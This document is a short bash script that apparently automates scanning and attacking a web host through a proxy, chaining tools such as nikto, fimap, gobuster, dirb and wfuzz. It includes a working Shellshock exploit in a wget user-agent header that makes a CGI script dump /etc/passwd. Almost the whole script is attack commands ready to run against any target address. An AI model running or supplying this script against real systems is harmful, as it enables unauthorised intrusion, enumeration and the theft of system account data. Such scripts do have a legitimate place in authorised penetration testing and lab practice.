#!/bin/bash          

IP=$1
LOGFILE=$1_http_scan.log   
PORT=${2:-80}
PROXY=$3
export PATH=$PATH:/usr/bin

if [ -z "$IP" -o -z "$PORT" ]
then
  echo "Usage: $0 host [port]"
  echo "port defaults to 80."
  exit 1
fi

#http_path=/usr/bin/httprint
dmitry_path=/usr/bin/dmitry
whatweb_path=/usr/bin/whatweb
amap_path=/usr/bin/amap
uniscan_path=/usr/bin/uniscan
fimap_path=/usr/bin/fimap
dirb_path=/usr/bin/dirb
wfuzz_path=/usr/bin/wfuzz
sqlmap_path=/usr/bin/sqlmap
dotdotpwn_path=/usr/sbin/dotdotpwn.pl
nikto_path=/usr/bin/nikto
gobuster_path=/usr/bin/gobuster
sslscan_path=/usr/bin/sslscan
curl_path=/usr/bin/curl
skipfish_path=/usr/bin/skipfish

if [[ "$IP" != "yes" ]]
then
wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=$IP:$PROXY "http://"$IP"/cgi-bin/status"
$nikto_path -e 1 -host http://$IP:$PORT  -useproxy http://$IP:$PROXY/
$fimap_path -u "http://$IP:$PORT/" http_proxy=$IP:$PROXY 
$gobuster_path -u http://$IP:$PORT/ -w /usr/share/wfuzz/wordlist/general/big.txt -s '200,204,301,302,307,403,500' -e -p http://$IP:$PROXY/
$dirb_path http://$IP:$PORT/ /usr/share/wordlists/dirb/big.txt -p $IP:$PROXY
cutycapt --url=http://$IP/index.html --out=$IP-index.html.jpg --http-proxy=http://$IP:$PROXY/
$wfuzz_path -c -v -w wordlist/general/big.txt $IP:$PORT -p $IP:$PROXY
fi
